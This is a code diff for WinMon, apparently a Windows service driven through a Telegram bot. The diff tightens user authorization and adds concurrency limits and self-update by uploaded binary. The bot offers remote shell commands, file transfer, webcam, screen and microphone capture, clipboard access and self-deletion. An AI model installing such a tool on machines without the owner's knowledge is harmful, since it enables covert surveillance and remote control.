@@ -26,23 +26,30 @@ import (
 	"winmon/internal/shell"
 	"winmon/internal/updater"
 )
-
 type BotCoordinator struct {
-	cfg      *config.Config
-	bot      *tgbotapi.BotAPI
-	stopChan chan struct{}
+	cfg        *config.Config
+	bot        *tgbotapi.BotAPI
+	stopChan   chan struct{}
+	handlerSem chan struct{}
 }
+
+const maxConcurrentHandlers = 4
 
 func NewBotCoordinator(cfg *config.Config, stopChan chan struct{}) *BotCoordinator {
 	return &BotCoordinator{
-		cfg:      cfg,
-		stopChan: stopChan,
+		cfg:        cfg,
+		stopChan:   stopChan,
+		handlerSem: make(chan struct{}, maxConcurrentHandlers),
 	}
 }
 
 func (b *BotCoordinator) Start() {
 	if len(b.cfg.AllowedUsers) == 0 {
 		log.Println("WARNING: allowed_users is empty in configuration! ALL incoming Telegram requests will be DENIED by default for security.")
+	}
+	if skipped := nonNumericAllowedUsers(b.cfg.AllowedUsers); len(skipped) > 0 {
+		// Defensive: LoadConfig already strips these; log if anything slipped through.
+		log.Printf("WARNING: non-numeric allowed_users entries are ignored (use numeric Telegram user IDs only): %v", skipped)
 	}
 
 	bot, err := tgbotapi.NewBotAPI(b.cfg.BotToken)
@@ -74,19 +81,46 @@ func (b *BotCoordinator) Start() {
 			if !ok {
 				return
 			}
-			go b.handleUpdate(update)
+			select {
+			case b.handlerSem <- struct{}{}:
+				go func(upd tgbotapi.Update) {
+					defer func() { <-b.handlerSem }()
+					b.handleUpdate(upd)
+				}(update)
+			default:
+				b.rejectBusy(update)
+			}
 		}
 	}
 }
 
-func (b *BotCoordinator) isAuthorized(userID int64, username string) bool {
+func nonNumericAllowedUsers(users []string) []string {
+	_, skipped := config.NormalizeAllowedUsers(users)
+	return skipped
+}
+
+func (b *BotCoordinator) rejectBusy(update tgbotapi.Update) {
+	if update.Message == nil || update.Message.From == nil {
+		return
+	}
+	msg := update.Message
+	if !b.isAuthorized(msg.From.ID, msg.From.UserName) {
+		return
+	}
+	b.sendText(msg.Chat.ID, "⏳ WinMon is busy handling other commands. Please try again in a moment.")
+}
+
+func (b *BotCoordinator) isAuthorized(userID int64, _ string) bool {
 	if len(b.cfg.AllowedUsers) == 0 {
 		return false
 	}
 	idStr := strconv.FormatInt(userID, 10)
 	for _, allowed := range b.cfg.AllowedUsers {
-		allowedClean := strings.TrimSpace(allowed)
-		if allowedClean == idStr || (username != "" && strings.EqualFold(allowedClean, username)) {
+		allowedClean := strings.TrimPrefix(strings.TrimSpace(allowed), "@")
+		if _, err := strconv.ParseInt(allowedClean, 10, 64); err != nil {
+			continue
+		}
+		if allowedClean == idStr {
 			return true
 		}
 	}
@@ -109,11 +143,15 @@ func (b *BotCoordinator) handleUpdate(update tgbotapi.Update) {
 		return
 	}
 
-	// Handle attachments (Uploads / Wallpapers)
+	// Handle attachments (Uploads / Wallpapers / Binary updates)
 	if msg.Photo != nil || msg.Document != nil {
 		caption := strings.TrimSpace(msg.Caption)
 		if strings.HasPrefix(caption, "/setwallpaper") {
 			b.handleSetWallpaperAttachment(msg)
+			return
+		}
+		if strings.HasPrefix(caption, "/update") {
+			b.handleUpdateBinaryAttachment(msg)
 			return
 		}
 		if strings.HasPrefix(caption, "/upload") {
@@ -157,44 +195,44 @@ func (b *BotCoordinator) processCommand(cmd string, args []string, chatID int64)
 		helpMsg := "⚡ **WinMon Available Commands**\n\n" +
 			"💻 /start - Show basic device status\n" +
 			"❓ /help - Show available commands list\n" +
-			"📸 /screenshot - Capture primary display screenshot\n" +
-			"📹 /webcam - Capture photo from active webcam\n" +
-			"🎥 /screenrecord [sec] - Record screen activity as GIF (e.g. /screenrecord 5)\n" +
-			"🎙 /listen [sec] - Record microphone audio voice note (e.g. /listen 5)\n" +
-			"🔊 /tts <text> - Convert text to speech and play on PC\n" +
-			"💻 /cmd <command> - Execute shell command (e.g. /cmd ipconfig)\n" +
 			"📊 /sysinfo - Display hardware metrics & system info\n" +
-			"⚙️ /processes - List running processes\n" +
-			"💀 /kill <PID|Name> - Kill process by PID or name\n" +
+			"⚙️ /processes - List top running processes\n" +
+			"💀 /kill <PID|Name> - Terminate process by PID or name\n" +
+			"🔒 /lock - Lock Windows workstation\n" +
+			"📸 /screenshot - Capture primary display screenshot\n" +
 			"📥 /download <path> - Download file from PC\n" +
 			"📤 /upload [path] - Upload file attachment to PC\n" +
 			"📋 /clipboard [text] - Read or set text on PC clipboard\n" +
+			"⌨️ /hotkey <keys> - Trigger key combination (e.g. /hotkey win+d)\n" +
 			"🔆 /brightness <0-100> - Set display brightness\n" +
 			"🔊 /volume <0-100|mute|unmute> - Set or toggle master audio\n" +
-			"🔒 /lock - Lock Windows workstation\n" +
 			"🔔 /notify <Title | Message> - Show toast notification on PC\n" +
-			"🖼 /setwallpaper - Set wallpaper from photo attachment\n" +
+			"🖼 /setwallpaper - Set wallpaper (attach photo with caption /setwallpaper)\n" +
 			"🖼 /wallpaper - Retrieve current desktop wallpaper photo\n" +
+			"⬆️ /update - Attach a new winmon.exe with caption /update to self-update\n" +
 			"🔄 /restartservice - Restart WinMon service\n" +
 			"🛑 /shutdownservice - Stop WinMon service/process\n" +
-			"💥 /implode - Self-destruct WinMon from this PC"
+			"💥 /implode confirm - Self-destruct WinMon from this PC"
 		b.sendText(chatID, helpMsg)
 
-	case "/screenshot", "/webcam", "/screenrecord", "/listen", "/clipboard", "/tts", "/wallpaper":
+	case "/screenshot", "/webcam", "/screenrecord", "/listen", "/clipboard", "/tts", "/wallpaper", "/lock", "/volume", "/hotkey":
 		b.executeCommandLocallyOrIPC(cmd, args, chatID)
-
-	case "/sysinfo", "/deviceinfo":
-		b.executeNativeTelegram("/sysinfo", args, chatID, time.Now())
-
-	case "/processes", "/kill", "/cmd", "/download", "/volume", "/brightness", "/lock", "/notify", "/setwallpaper":
+	case "/cmd", "/download", "/brightness", "/notify", "/sysinfo", "/deviceinfo", "/processes", "/kill":
 		b.executeNativeTelegram(cmd, args, chatID, time.Now())
+
+	case "/setwallpaper":
+		b.sendText(chatID, "🖼 Usage: Attach a photo with the caption `/setwallpaper` to set desktop wallpaper.")
 
 	case "/restartservice":
 		b.sendText(chatID, "🔄 Restarting WinMon service...")
 		if service.IsRunningAsService() {
-			if err := service.StartService("WinMon"); err != nil {
-				log.Printf("Failed to restart WinMon service: %v", err)
+			if err := service.RestartServiceDetached(); err != nil {
+				b.sendText(chatID, fmt.Sprintf("❌ [Error] Failed to schedule service restart: %v", err))
+				return
 			}
+			b.sendText(chatID, "✅ Restart scheduled. WinMon will come back shortly.")
+		} else {
+			b.sendText(chatID, "ℹ️ Not running as a Windows service. Restart the console process manually.")
 		}
 
 	case "/shutdownservice":
@@ -211,25 +249,21 @@ func (b *BotCoordinator) processCommand(cmd string, args []string, chatID int64)
 		}
 
 	case "/implode":
-		if len(args) > 0 && strings.ToLower(args[0]) == "confirm" {
-			b.sendText(chatID, "💥 Uninstalling WinMon service and self-destructing...")
-			err := updater.ImplodeService(b.cfg.BotToken, chatID)
-			if err != nil {
-				b.sendText(chatID, fmt.Sprintf("❌ [Error] Implode failed: %v", err))
-			}
+		if len(args) == 0 || strings.ToLower(args[0]) != "confirm" {
+			confirmMsg := "⚠️ **Self-Destruct Confirmation Required**\n\n" +
+				"Are you sure you want to completely uninstall WinMon and delete all files from this PC?\n\n" +
+				"Type `/implode confirm` to execute self-destruction."
+			b.sendText(chatID, confirmMsg)
 			return
 		}
-		confirmMsg := "⚠️ **Self-Destruct Confirmation Required**\n\n" +
-			"Are you sure you want to completely uninstall WinMon and delete all files from this PC?\n\n" +
-			"Type /confirm_implode to execute self-destruction."
-		b.sendText(chatID, confirmMsg)
-
-	case "/confirm_implode":
 		b.sendText(chatID, "💥 Uninstalling WinMon service and self-destructing...")
 		err := updater.ImplodeService(b.cfg.BotToken, chatID)
 		if err != nil {
 			b.sendText(chatID, fmt.Sprintf("❌ [Error] Implode failed: %v", err))
 		}
+
+	case "/update":
+		b.sendText(chatID, "Usage: attach a new `winmon.exe` document with caption `/update`.")
 
 	default:
 		b.sendText(chatID, fmt.Sprintf("Unknown command: `%s`. Type /help for available commands.", cmd))
@@ -240,24 +274,8 @@ func (b *BotCoordinator) executeCommandLocallyOrIPC(cmd string, args []string, c
 	start := time.Now()
 	flatArgs := strings.Join(args, " ")
 
-	var customTempPath string
 	ts := time.Now().UnixNano()
-	switch cmd {
-	case "/screenshot":
-		customTempPath = filepath.Join(service.GetSharedTempDir(), fmt.Sprintf("helper_screenshot_%d.jpg", ts))
-	case "/webcam":
-		customTempPath = filepath.Join(service.GetSharedTempDir(), fmt.Sprintf("helper_webcam_%d.jpg", ts))
-	case "/screenrecord":
-		customTempPath = filepath.Join(service.GetSharedTempDir(), fmt.Sprintf("helper_record_%d.gif", ts))
-	case "/listen":
-		customTempPath = filepath.Join(service.GetSharedTempDir(), fmt.Sprintf("helper_audio_%d.wav", ts))
-	case "/clipboard":
-		customTempPath = filepath.Join(service.GetSharedTempDir(), fmt.Sprintf("helper_clipboard_%d.txt", ts))
-	case "/wallpaper":
-		// Extension is applied by the session helper based on the real wallpaper format.
-		customTempPath = filepath.Join(service.GetSharedTempDir(), fmt.Sprintf("helper_wallpaper_%d", ts))
-	}
-
+	customTempPath := helperTempPath(cmd, ts)
 	if service.IsRunningAsService() {
 		// Route via Session 1 IPC Agent
 		resp, err := service.SendIPCCommand(service.IPCRequest{
@@ -280,12 +298,16 @@ func (b *BotCoordinator) executeCommandLocallyOrIPC(cmd string, args []string, c
 			b.sendText(chatID, fmt.Sprintf("[Error] IPC Command Error: %s", resp.Error))
 			return
 		}
-		b.handleHelperOutputTelegram(cmd, chatID, start, customTempPath)
+		outPath := customTempPath
+		if resp.OutputFile != "" {
+			outPath = resp.OutputFile
+		}
+		b.handleHelperOutputTelegram(cmd, chatID, start, outPath)
 		return
 	}
 
 	// Console mode / Local service execution
-	err := RunSessionHelper(cmd, flatArgs, customTempPath)
+	outPath, err := RunSessionHelper(cmd, flatArgs, customTempPath)
 	if err != nil {
 		if customTempPath != "" {
 			_ = os.Remove(customTempPath)
@@ -293,46 +315,13 @@ func (b *BotCoordinator) executeCommandLocallyOrIPC(cmd string, args []string, c
 		b.sendText(chatID, fmt.Sprintf("[Error] Command Error: %v", err))
 		return
 	}
-	b.handleHelperOutputTelegram(cmd, chatID, start, customTempPath)
+	b.handleHelperOutputTelegram(cmd, chatID, start, outPath)
 }
 
 func (b *BotCoordinator) executeNativeTelegram(cmd string, args []string, chatID int64, start time.Time) {
 	dur := fmt.Sprintf("(%d ms)", time.Since(start).Milliseconds())
 
 	switch cmd {
-	case "/sysinfo", "/deviceinfo":
-		info, err := device.GetDeviceInfo(b.cfg.DeviceName, b.cfg.DeviceID, b.cfg.Version)
-		if err != nil {
-			b.sendText(chatID, fmt.Sprintf("[Error] Error getting sysinfo: %v", err))
-			return
-		}
-		msg := fmt.Sprintf("**WinMon System Metrics** %s\n```\n%s\n```", dur, info)
-		b.sendText(chatID, msg)
-
-	case "/processes":
-		procs, err := shell.ExecuteCommand("tasklist", 10*time.Second)
-		if err != nil {
-			b.sendText(chatID, fmt.Sprintf("[Error] Error fetching processes: %v", err))
-			return
-		}
-		if len(procs) > 3800 {
-			procs = procs[:3800] + "\n... [truncated]"
-		}
-		b.sendText(chatID, fmt.Sprintf("**Running Processes:** %s\n```\n%s\n```", dur, procs))
-
-	case "/kill":
-		if len(args) < 1 {
-			b.sendText(chatID, "Usage: /kill <PID or ProcessName>")
-			return
-		}
-		killCmd := fmt.Sprintf("taskkill /F /PID %s || taskkill /F /IM %s", args[0], args[0])
-		out, err := shell.ExecuteCommand(killCmd, 10*time.Second)
-		if err != nil {
-			b.sendText(chatID, fmt.Sprintf("[Error] Process kill output:\n```\n%s\nError: %v\n```", out, err))
-		} else {
-			b.sendText(chatID, fmt.Sprintf("Process `%s` terminated successfully:\n```\n%s\n```", args[0], out))
-		}
-
 	case "/cmd":
 		if len(args) < 1 {
 			b.sendText(chatID, "Usage: /cmd <command>")
@@ -357,30 +346,67 @@ func (b *BotCoordinator) executeNativeTelegram(cmd string, args []string, chatID
 		filePath := strings.Join(args, " ")
 		b.sendFile(chatID, filePath, fmt.Sprintf("Downloaded from `%s`:", b.cfg.DeviceName))
 
-	case "/volume":
-		if len(args) < 1 {
-			b.sendText(chatID, "Usage: /volume <0-100 | mute | unmute>")
+	case "/sysinfo", "/deviceinfo":
+		info, err := device.GetDeviceInfo(b.cfg.DeviceName, b.cfg.DeviceID, b.cfg.Version)
+		if err != nil {
+			b.sendText(chatID, fmt.Sprintf("❌ [Error] Failed to get system info: %v", err))
 			return
 		}
-		arg := strings.ToLower(args[0])
-		if arg == "mute" {
-			_ = audio.SetMute(true)
-			b.sendText(chatID, "Audio Muted.")
-		} else if arg == "unmute" {
-			_ = audio.SetMute(false)
-			b.sendText(chatID, "Audio Unmuted.")
+		status, _ := device.GetStatus()
+
+		msg := fmt.Sprintf("📊 **System Information & Hardware Metrics**\n\n"+
+			"• **Device Name:** `%s` (ID: `%s`)\n"+
+			"• **Computer Name:** `%s`\n"+
+			"• **OS:** `%s`\n"+
+			"• **IP Address:** `%s`\n"+
+			"• **Uptime:** `%s`\n"+
+			"• **WinMon Version:** `%s`\n",
+			info.DeviceName, info.DeviceID, info.PCName, info.OS, info.IPAddress, device.FormatDuration(info.Uptime), info.Version)
+
+		if status != nil {
+			ramUsedGB := status.RAMTotalGB - status.RAMFreeGB
+			diskUsedGB := status.DiskTotalGB - status.DiskFreeGB
+			msg += fmt.Sprintf("\n⚡ **Hardware Metrics:**\n"+
+				"• **CPU Load:** `%.1f%%`\n"+
+				"• **RAM Usage:** `%.1f%%` (%.1f GB / %.1f GB)\n"+
+				"• **Disk Usage:** `%.1f%%` (%.1f GB / %.1f GB)\n",
+				status.CPUPercent, status.RAMPercent, ramUsedGB, status.RAMTotalGB,
+				status.DiskPercent, diskUsedGB, status.DiskTotalGB)
+			if status.BatteryCharge >= 0 {
+				msg += fmt.Sprintf("• **Battery:** `%d%%` (%s)\n", status.BatteryCharge, status.BatteryStatus)
+			}
+		}
+		b.sendText(chatID, msg)
+
+	case "/processes":
+		psCmd := `Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First 25 | Format-Table Id, ProcessName, @{Name='RAM (MB)';Expression={[math]::Round($_.WorkingSet64/1MB, 1)}} -AutoSize | Out-String`
+		out, err := shell.ExecuteCommand("powershell -NoProfile -NonInteractive -Command \""+psCmd+"\"", 15*time.Second)
+		if err != nil || strings.TrimSpace(out) == "" {
+			b.sendText(chatID, fmt.Sprintf("❌ [Error] Failed to list processes: %v", err))
 		} else {
-			vol, err := strconv.Atoi(arg)
-			if err != nil {
-				b.sendText(chatID, "Volume must be an integer between 0 and 100.")
-				return
+			b.sendText(chatID, fmt.Sprintf("⚙️ **Top Processes by Memory Usage:** %s\n```\n%s\n```", dur, strings.TrimSpace(out)))
+		}
+
+	case "/kill":
+		if len(args) < 1 {
+			b.sendText(chatID, "Usage: /kill <PID|ProcessName> (e.g. `/kill 1234` or `/kill notepad.exe`)")
+			return
+		}
+		target := strings.TrimSpace(args[0])
+		var killCmd string
+		if _, err := strconv.Atoi(target); err == nil {
+			killCmd = fmt.Sprintf("taskkill /F /PID %s", target)
+		} else {
+			if !strings.HasSuffix(strings.ToLower(target), ".exe") {
+				target += ".exe"
 			}
-			err = audio.SetVolume(vol)
-			if err != nil {
-				b.sendText(chatID, fmt.Sprintf("[Error] Failed to set volume: %v", err))
-			} else {
-				b.sendText(chatID, fmt.Sprintf("Volume set to **%d%%**.", vol))
-			}
+			killCmd = fmt.Sprintf("taskkill /F /IM \"%s\"", target)
+		}
+		out, err := shell.ExecuteCommand(killCmd, 10*time.Second)
+		if err != nil {
+			b.sendText(chatID, fmt.Sprintf("❌ [Error] Failed to terminate process `%s`:\n```\n%s\n```", target, out))
+		} else {
+			b.sendText(chatID, fmt.Sprintf("💀 Process `%s` terminated successfully:\n```\n%s\n```", target, strings.TrimSpace(out)))
 		}
 
 	case "/brightness":
@@ -403,10 +429,6 @@ func (b *BotCoordinator) executeNativeTelegram(cmd string, args []string, chatID
 				b.sendText(chatID, fmt.Sprintf("Brightness set to **%d%%**.", bri))
 			}
 		}
-
-	case "/lock":
-		_ = input.TriggerHotkey("win+l")
-		b.sendText(chatID, "Workstation Locked.")
 
 	case "/notify":
 		if len(args) < 1 {
@@ -434,64 +456,69 @@ func (b *BotCoordinator) executeNativeTelegram(cmd string, args []string, chatID
 	}
 }
 
+type mediaKind int
+
+const (
+	mediaKindPhoto mediaKind = iota
+	mediaKindAnimation
+	mediaKindFile
+)
+
+func helperTempPath(cmd string, ts int64) string {
+	dir := service.GetSharedTempDir()
+	switch cmd {
+	case "/screenshot":
+		return filepath.Join(dir, fmt.Sprintf("helper_screenshot_%d.jpg", ts))
+	case "/webcam":
+		return filepath.Join(dir, fmt.Sprintf("helper_webcam_%d.jpg", ts))
+	case "/screenrecord":
+		return filepath.Join(dir, fmt.Sprintf("helper_record_%d.gif", ts))
+	case "/listen":
+		return filepath.Join(dir, fmt.Sprintf("helper_audio_%d.wav", ts))
+	case "/clipboard":
+		return filepath.Join(dir, fmt.Sprintf("helper_clipboard_%d.txt", ts))
+	case "/wallpaper":
+		return filepath.Join(dir, fmt.Sprintf("helper_wallpaper_%d", ts))
+	default:
+		return ""
+	}
+}
+
+func (b *BotCoordinator) handleMediaOutput(chatID int64, tempPath, defaultFileName string, kind mediaKind, caption, errMsg string) {
+	if tempPath == "" {
+		tempPath = filepath.Join(service.GetSharedTempDir(), defaultFileName)
+	}
+	if _, err := os.Stat(tempPath); err == nil {
+		switch kind {
+		case mediaKindPhoto:
+			b.sendPhoto(chatID, tempPath, caption)
+		case mediaKindAnimation:
+			b.sendAnimation(chatID, tempPath, caption)
+		case mediaKindFile:
+			b.sendFile(chatID, tempPath, caption)
+		}
+		os.Remove(tempPath)
+	} else {
+		b.sendText(chatID, errMsg)
+	}
+}
+
 func (b *BotCoordinator) handleHelperOutputTelegram(cmd string, chatID int64, start time.Time, tempPath string) {
 	dur := fmt.Sprintf("(%d ms)", time.Since(start).Milliseconds())
 
 	switch cmd {
 	case "/screenshot":
-		if tempPath == "" {
-			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_screenshot.jpg")
-		}
-		if _, err := os.Stat(tempPath); err == nil {
-			b.sendPhoto(chatID, tempPath, "📸 **Desktop Screenshot** "+dur)
-			os.Remove(tempPath)
-		} else {
-			b.sendText(chatID, "❌ [Error] Failed to retrieve screenshot from session agent.")
-		}
+		b.handleMediaOutput(chatID, tempPath, "helper_screenshot.jpg", mediaKindPhoto, "📸 **Desktop Screenshot** "+dur, "❌ [Error] Failed to retrieve screenshot from session agent.")
 	case "/webcam":
-		if tempPath == "" {
-			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_webcam.jpg")
-		}
-		if _, err := os.Stat(tempPath); err == nil {
-			b.sendPhoto(chatID, tempPath, "📹 **Webcam Photo** "+dur)
-			os.Remove(tempPath)
-		} else {
-			b.sendText(chatID, "❌ [Error] Failed to retrieve webcam photo from session agent.")
-		}
+		b.handleMediaOutput(chatID, tempPath, "helper_webcam.jpg", mediaKindPhoto, "📹 **Webcam Photo** "+dur, "❌ [Error] Failed to retrieve webcam photo from session agent.")
 	case "/screenrecord":
-		if tempPath == "" {
-			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_record.gif")
-		}
-		if _, err := os.Stat(tempPath); err == nil {
-			b.sendAnimation(chatID, tempPath, "🎥 **Screen Recording GIF** "+dur)
-			os.Remove(tempPath)
-		} else {
-			b.sendText(chatID, "❌ [Error] Failed to retrieve screen recording from session agent.")
-		}
+		b.handleMediaOutput(chatID, tempPath, "helper_record.gif", mediaKindAnimation, "🎥 **Screen Recording GIF** "+dur, "❌ [Error] Failed to retrieve screen recording from session agent.")
 	case "/listen":
-		if tempPath == "" {
-			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_audio.wav")
-		}
-		if _, err := os.Stat(tempPath); err == nil {
-			b.sendVoice(chatID, tempPath, "🎙️ **Microphone Audio Voice Note** "+dur)
-			os.Remove(tempPath)
-		} else {
-			b.sendText(chatID, "❌ [Error] Failed to retrieve audio recording from session agent.")
-		}
-	case "/clipboard":
-		if tempPath == "" {
-			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_clipboard.txt")
-		}
-		if data, err := os.ReadFile(tempPath); err == nil {
-			b.sendText(chatID, fmt.Sprintf("📋 **Clipboard Content:**\n```\n%s\n```", string(data)))
-			os.Remove(tempPath)
-		} else {
-			b.sendText(chatID, "❌ [Error] Failed to read clipboard from session agent.")
-		}
-	case "/tts":
-		b.sendText(chatID, "🔊 Spoke text on PC speakers.")
+		b.handleMediaOutput(chatID, tempPath, "helper_audio.wav", mediaKindFile, "🎙️ **Microphone Audio Recording** "+dur, "❌ [Error] Failed to retrieve audio recording from session agent.")
 	case "/notify":
 		b.sendText(chatID, "🔔 Notification displayed on PC screen.")
+	case "/hotkey":
+		b.sendText(chatID, fmt.Sprintf("⌨️ Hotkey trigger executed %s.", dur))
 	case "/wallpaper":
 		if tempPath == "" {
 			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_wallpaper")
@@ -571,7 +598,7 @@ func (b *BotCoordinator) sendFile(chatID int64, filePath string, caption string)
 	}
 }
 
-func (b *BotCoordinator) handleAttachmentUpload(msg *tgbotapi.Message, destination string) {
+func (b *BotCoordinator) handleAttachmentUpload(msg *tgbotapi.Message, destination string) (string, error) {
 	chatID := msg.Chat.ID
 	var fileID string
 	var fileName string
@@ -586,84 +613,137 @@ func (b *BotCoordinator) handleAttachmentUpload(msg *tgbotapi.Message, destinati
 	}
 
 	if fileID == "" {
-		b.sendText(chatID, "[Error] No valid attachment found to download.")
-		return
+		err := fmt.Errorf("no valid attachment found to download")
+		b.sendText(chatID, fmt.Sprintf("[Error] %v", err))
+		return "", err
 	}
 
 	fileURL, err := b.bot.GetFileDirectURL(fileID)
 	if err != nil {
 		b.sendText(chatID, fmt.Sprintf("[Error] Failed to resolve Telegram file URL: %v", err))
-		return
+		return "", err
 	}
 
 	finalPath, err := files.PrepareUploadPath(destination, fileName)
 	if err != nil {
 		b.sendText(chatID, fmt.Sprintf("[Error] Invalid upload destination: %v", err))
-		return
+		return "", err
 	}
 
 	resp, err := http.Get(fileURL)
 	if err != nil {
 		b.sendText(chatID, fmt.Sprintf("[Error] Failed to download file stream: %v", err))
-		return
+		return "", err
 	}
 	defer resp.Body.Close()
 
 	out, err := os.Create(finalPath)
 	if err != nil {
 		b.sendText(chatID, fmt.Sprintf("[Error] Failed to create target file: %v", err))
-		return
+		return "", err
 	}
 	defer out.Close()
 
 	_, err = io.Copy(out, resp.Body)
 	if err != nil {
 		b.sendText(chatID, fmt.Sprintf("[Error] Failed to save file contents: %v", err))
-		return
+		return "", err
 	}
 
 	b.sendText(chatID, fmt.Sprintf("File uploaded successfully to `%s`", finalPath))
+	return finalPath, nil
 }
 
 func (b *BotCoordinator) handleSetWallpaperAttachment(msg *tgbotapi.Message) {
 	chatID := msg.Chat.ID
 	tempPath := filepath.Join(service.GetSharedTempDir(), fmt.Sprintf("winmon_wall_%d.jpg", time.Now().UnixNano()))
-	b.handleAttachmentUpload(msg, tempPath)
-	b.executeCommandLocallyOrIPC("/setwallpaper", []string{tempPath}, chatID)
-	_ = os.Remove(tempPath)
+	savedPath, err := b.handleAttachmentUpload(msg, tempPath)
+	if err != nil {
+		return
+	}
+	defer os.Remove(savedPath)
+	b.executeCommandLocallyOrIPC("/setwallpaper", []string{savedPath}, chatID)
+}
+
+func (b *BotCoordinator) handleUpdateBinaryAttachment(msg *tgbotapi.Message) {
+	chatID := msg.Chat.ID
+	if msg.Document == nil {
+		b.sendText(chatID, "[Error] /update requires a document attachment (new winmon.exe).")
+		return
+	}
+
+	fileURL, err := b.bot.GetFileDirectURL(msg.Document.FileID)
+	if err != nil {
+		b.sendText(chatID, fmt.Sprintf("[Error] Failed to resolve Telegram file URL: %v", err))
+		return
+	}
+
+	tempPath := filepath.Join(service.GetSharedTempDir(), fmt.Sprintf("winmon_update_%d.exe", time.Now().UnixNano()))
+	resp, err := http.Get(fileURL)
+	if err != nil {
+		b.sendText(chatID, fmt.Sprintf("[Error] Failed to download update binary: %v", err))
+		return
+	}
+	defer resp.Body.Close()
+
+	out, err := os.Create(tempPath)
+	if err != nil {
+		b.sendText(chatID, fmt.Sprintf("[Error] Failed to create temp update file: %v", err))
+		return
+	}
+	_, copyErr := io.Copy(out, resp.Body)
+	out.Close()
+	if copyErr != nil {
+		_ = os.Remove(tempPath)
+		b.sendText(chatID, fmt.Sprintf("[Error] Failed to save update binary: %v", copyErr))
+		return
+	}
+
+	if err := updater.ValidateBinary(tempPath); err != nil {
+		_ = os.Remove(tempPath)
+		b.sendText(chatID, fmt.Sprintf("[Error] Invalid update binary: %v", err))
+		return
+	}
+
+	b.sendText(chatID, "⬆️ Valid update binary received. Applying update and restarting...")
+	if err := updater.UpdateService(tempPath, b.cfg.BotToken, chatID); err != nil {
+		_ = os.Remove(tempPath)
+		b.sendText(chatID, fmt.Sprintf("[Error] Failed to start updater: %v", err))
+		return
+	}
 }
 
 // Session helper commands (executed inside user desktop session)
-func RunSessionHelper(cmd string, args string, outputFile string) error {
+func RunSessionHelper(cmd string, args string, outputFile string) (string, error) {
 	switch cmd {
 	case "/screenshot":
 		tempPath := outputFile
 		if tempPath == "" {
 			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_screenshot.jpg")
 		}
-		return media.CaptureScreen(tempPath)
+		return tempPath, media.CaptureScreen(tempPath)
 	case "/webcam":
 		tempPath := outputFile
 		if tempPath == "" {
 			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_webcam.jpg")
 		}
-		return media.CaptureWebcam(tempPath)
+		return tempPath, media.CaptureWebcam(tempPath)
 	case "/screenrecord":
 		dur := parseDuration(args)
 		tempPath := outputFile
 		if tempPath == "" {
 			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_record.gif")
 		}
-		return media.RecordScreen(dur, tempPath)
+		return tempPath, media.RecordScreen(dur, tempPath)
 	case "/listen":
 		dur := parseDuration(args)
 		tempPath := outputFile
 		if tempPath == "" {
 			tempPath = filepath.Join(service.GetSharedTempDir(), "helper_audio.wav")
 		}
-		return media.RecordAudio(dur, tempPath)
+		return tempPath, media.RecordAudio(dur, tempPath)
 	case "/setwallpaper":
-		return display.SetWallpaperLocal(args)
+		return "", display.SetWallpaperLocal(args)
 	case "/wallpaper":
 		tempPath := outputFile
 		if tempPath == "" {
@@ -671,11 +751,11 @@ func RunSessionHelper(cmd string, args string, outputFile string) error {
 		}
 		wallPath, err := display.GetWallpaperPath()
 		if err != nil {
-			return fmt.Errorf("failed to get wallpaper path: %w", err)
+			return "", fmt.Errorf("failed to get wallpaper path: %w", err)
 		}
 		data, err := os.ReadFile(wallPath)
 		if err != nil {
-			return fmt.Errorf("failed to read wallpaper file at %s: %w", wallPath, err)
+			return "", fmt.Errorf("failed to read wallpaper file at %s: %w", wallPath, err)
 		}
 		ext := strings.ToLower(filepath.Ext(wallPath))
 		if ext == "" {
@@ -685,7 +765,8 @@ func RunSessionHelper(cmd string, args string, outputFile string) error {
 			tempPath = strings.TrimSuffix(tempPath, filepath.Ext(tempPath))
 		}
 		tempPath = tempPath + ext
-		return os.WriteFile(tempPath, data, 0644)
+		err = os.WriteFile(tempPath, data, 0644)
+		return tempPath, err
 	case "/notify":
 		parts := strings.Split(args, "|")
 		title := "WinMon Notification"
@@ -696,11 +777,11 @@ func RunSessionHelper(cmd string, args string, outputFile string) error {
 		}
 		err := notifications.ShowToastLocal(title, msg)
 		if err != nil {
-			return notifications.ShowAlert(title, msg)
+			return "", notifications.ShowAlert(title, msg)
 		}
-		return nil
+		return "", nil
 	case "/tts":
-		return audio.SpeakTTS(args)
+		return "", audio.SpeakTTS(args)
 	case "/clipboard":
 		tempPath := outputFile
 		if tempPath == "" {
@@ -709,26 +790,48 @@ func RunSessionHelper(cmd string, args string, outputFile string) error {
 		if strings.TrimSpace(args) != "" {
 			err := clipboard.SetClipboardLocal(args)
 			if err != nil {
-				return err
+				return "", err
 			}
-			return os.WriteFile(tempPath, []byte("Clipboard text updated successfully."), 0644)
+			return tempPath, os.WriteFile(tempPath, []byte("Clipboard text updated successfully."), 0644)
 		}
 		txt, err := clipboard.GetClipboardLocal()
 		if err != nil || strings.TrimSpace(txt) == "" {
 			txt = "(Clipboard is empty or contains non-text data)"
 		}
-		return os.WriteFile(tempPath, []byte(txt), 0644)
+		return tempPath, os.WriteFile(tempPath, []byte(txt), 0644)
 	case "/setclipboard":
-		return clipboard.SetClipboardLocal(args)
+		return "", clipboard.SetClipboardLocal(args)
 	case "/brightness":
 		bri, err := strconv.Atoi(args)
 		if err != nil {
-			return fmt.Errorf("brightness must be an integer: %w", err)
+			return "", fmt.Errorf("brightness must be an integer: %w", err)
 		}
-		return display.SetBrightness(bri)
+		return "", display.SetBrightness(bri)
+	case "/lock":
+		return "", display.LockWorkstation()
+	case "/volume":
+		if strings.TrimSpace(args) == "" {
+			return "", fmt.Errorf("usage: /volume <0-100|mute|unmute>")
+		}
+		arg := strings.ToLower(strings.TrimSpace(args))
+		if arg == "mute" {
+			return "", audio.SetMute(true)
+		} else if arg == "unmute" {
+			return "", audio.SetMute(false)
+		} else {
+			vol, err := strconv.Atoi(arg)
+			if err != nil {
+				return "", fmt.Errorf("volume must be an integer (0-100) or 'mute'/'unmute'")
+			}
+			return "", audio.SetVolume(vol)
+		}
+	case "/hotkey":
+		if strings.TrimSpace(args) == "" {
+			return "", fmt.Errorf("usage: /hotkey <keys> (e.g. /hotkey win+d or /hotkey ctrl+c)")
